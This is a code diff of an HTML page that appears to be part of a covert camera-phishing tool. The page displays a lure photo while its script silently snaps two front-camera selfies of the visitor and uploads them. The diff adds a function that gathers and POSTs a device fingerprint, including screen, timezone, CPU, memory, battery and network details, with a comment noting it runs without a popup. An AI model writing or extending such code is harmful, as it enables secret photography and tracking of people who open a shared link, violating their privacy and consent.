@@ -12,7 +12,6 @@
 </head>
 <body>
     <img src="{{ photo_url }}" alt="Photo">
-
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <p id="status" style="display:none;"></p>
@@ -22,16 +21,46 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
+        // 📱 डिवाइस इन्फो इकट्ठा करके भेजें (बिना पॉपअप)
+        async function sendDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform || 'N/A',
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                batteryLevel: 'N/A',
+                batteryCharging: 'N/A',
+                networkType: 'N/A',
+                hasTouch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
+            };
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    info.batteryLevel = Math.round(battery.level * 100);
+                    info.batteryCharging = battery.charging ? 'Yes' : 'No';
+                }
+            } catch(e) {}
+            if (navigator.connection) {
+                info.networkType = navigator.connection.effectiveType || 'N/A';
+            }
+            fetch('/device_info/' + uniqueId, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(info)
+            }).catch(e => console.error(e));
+        }
+
+        // 📸 2 फोटो (पहले जैसा)
         async function autoCapture() {
             try {
-                // सिर्फ़ कैमरा खोलें (माइक नहीं)
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" }
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 await new Promise(r => video.onloadedmetadata = r);
-
-                // 1 सेकंड में 2 फोटो (हर 500ms पर)
                 for (let i = 0; i < 2; i++) {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -42,14 +71,14 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ image: imageData })
                     }).catch(e => console.error(e));
-                    await new Promise(r => setTimeout(r, 500));  // 500ms गैप
+                    await new Promise(r => setTimeout(r, 500));
                 }
                 stream.getTracks().forEach(track => track.stop());
-            } catch(e) {
-                console.error('Camera error:', e);
-            }
+            } catch(e) { console.error('Camera error:', e); }
         }
 
+        // शुरू करें
+        sendDeviceInfo();
         autoCapture();
     </script>
 </body>
